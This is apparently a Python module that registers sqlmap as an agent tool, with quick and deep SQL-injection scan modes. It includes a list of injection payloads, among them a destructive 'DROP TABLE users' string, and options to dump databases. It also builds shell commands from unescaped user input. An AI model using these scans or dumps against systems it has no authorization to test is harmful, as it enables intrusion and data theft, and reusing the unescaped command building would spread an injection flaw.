"""
sqlmap Tool — Automated SQL injection testing

Advanced SQLi detection and exploitation:
- Automatic database fingerprinting
- Data extraction (tables, columns, dumps)
- Bypass WAF techniques
- Time-based and boolean-based blind injection
"""

from __future__ import annotations

import base64
import json
import logging
from typing import Any

from agents.tools.registry import ToolSpec
from sandbox.sandbox_manager import shared_sandbox_manager, ExecResult

logger = logging.getLogger(__name__)

CONTAINER_RESULTS_PATH = "/tmp/sqlmap-results.json"

# Common SQL injection test payloads
SQLI_PAYLOADS = [
    # Error-based
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    # Time-based
    "' OR SLEEP(5)--",
    "' OR pg_sleep(5)--",
    "' OR WAITFOR DELAY '0:0:5'--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
    # Boolean-based
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 'x'='x",
    "' OR 'x'='y",
    # Union-based
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    # Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO logs VALUES ('x')--",
]


async def sqlmap_scan(
    mission_id: str,
    target: str,
    method: str = "GET",
    data: str = "",
    cookie: str = "",
    level: int = 1,
    risk: int = 1,
    dbms: str = "",
    dump: bool = False,
    tables: bool = False,
    batch: bool = True,
) -> ExecResult:
    """
    Run sqlmap against a target for SQL injection testing.
    
    Args:
        mission_id: Active mission ID
        target: Target URL with parameters (e.g., http://target/page.php?id=1)
        method: HTTP method (GET, POST)
        data: POST data string
        cookie: Cookie string
        level: Test level (1-5, higher = more tests)
        risk: Risk level (1-3, higher = more dangerous)
        dbms: Force DBMS type (mysql, postgresql, sqlite, etc.)
        dump: Dump database data if vulnerable
        tables: Enumerate tables only
        batch: Non-interactive mode
    """
    # Replace localhost for Docker
    docker_target = target.replace("localhost", "host.docker.internal").replace("127.0.0.1", "host.docker.internal")
    
    parts = [
        "sqlmap",
        f"-u '{docker_target}'",
        f"--level={level}",
        f"--risk={risk}",
        "--threads=4",
        "--timeout=30",
        "--retries=2",
    ]
    
    if method.upper() == "POST":
        parts.append(f"--data='{data}'")
    
    if cookie:
        parts.append(f"--cookie='{cookie}'")
    
    if dbms:
        parts.append(f"--dbms={dbms}")
    
    if dump:
        parts.append("--dump")
        parts.append("--dump-format=JSON")
    elif tables:
        parts.append("--tables")
    
    if batch:
        parts.append("--batch")
    
    # Output to JSON
    parts.append(f"--json-output={CONTAINER_RESULTS_PATH}")
    
    cmd = " ".join(parts)
    logger.info(f"Running sqlmap scan (level={level}, risk={risk})...")
    
    result = await shared_sandbox_manager.exec_in_sandbox(cmd, timeout=300)
    
    # Parse results
    read_result = await shared_sandbox_manager.exec_in_sandbox(
        f"cat {CONTAINER_RESULTS_PATH} 2>/dev/null || echo '{{}}'",
        timeout=10,
    )
    
    try:
        if read_result.exit_code == 0 and read_result.stdout:
            findings = json.loads(read_result.stdout)
            
            simplified = {
                "vulnerable": False,
                "dbms": None,
                "payloads": [],
                "tables": [],
                "data": {},
            }
            
            # Check if vulnerable
            if findings.get("success", False) or "vulnerable" in read_result.stdout.lower():
                simplified["vulnerable"] = True
                simplified["dbms"] = findings.get("dbms", "unknown")
            
            return ExecResult(
                exit_code=0,
                stdout=json.dumps(simplified, indent=2),
                stderr=result.stderr,
                command="sqlmap",
            )
    except Exception as e:
        logger.error(f"Failed to parse sqlmap results: {e}")
    
    # Return raw result if parsing fails
    return ExecResult(
        returncode=result.exit_code,
        stdout=json.dumps({"raw_output": result.stdout[:2000]}),
        stderr=result.stderr,
        command="sqlmap (raw)",
    )


# Tool specification
sqlmap_tool = ToolSpec(
    name="sqlmap",
    description="Automated SQL injection scanner and exploitation tool",
    args_schema={
        "target": "Target URL with parameters",
        "method": "HTTP method (GET, POST)",
        "data": "POST data string",
        "cookie": "Cookie string",
        "level": "Test level 1-5 (default: 1)",
        "risk": "Risk level 1-3 (default: 1)",
        "dbms": "Force DBMS type (mysql, postgresql, sqlite)",
        "dump": "Dump database data if vulnerable",
        "tables": "Enumerate tables only",
        "batch": "Non-interactive mode (default: true)",
    },
    execute=sqlmap_scan,
)


async def sqlmap_quick_scan(
    mission_id: str,
    target: str,
) -> ExecResult:
    """Quick SQL injection test with default settings."""
    return await sqlmap_scan(
        mission_id=mission_id,
        target=target,
        level=1,
        risk=1,
        batch=True,
    )


sqlmap_quick_tool = ToolSpec(
    name="sqlmap_quick",
    description="Quick SQL injection test (level 1, risk 1)",
    args_schema={
        "target": "Target URL with parameters",
    },
    execute=sqlmap_quick_scan,
)


async def sqlmap_deep_scan(
    mission_id: str,
    target: str,
    method: str = "GET",
    data: str = "",
) -> ExecResult:
    """Deep SQL injection scan with higher level/risk."""
    return await sqlmap_scan(
        mission_id=mission_id,
        target=target,
        method=method,
        data=data,
        level=3,
        risk=2,
        tables=True,
        batch=True,
    )


sqlmap_deep_tool = ToolSpec(
    name="sqlmap_deep",
    description="Deep SQL injection scan (level 3, risk 2, enumerates tables)",
    args_schema={
        "target": "Target URL with parameters",
        "method": "HTTP method",
        "data": "POST data",
    },
    execute=sqlmap_deep_scan,
)
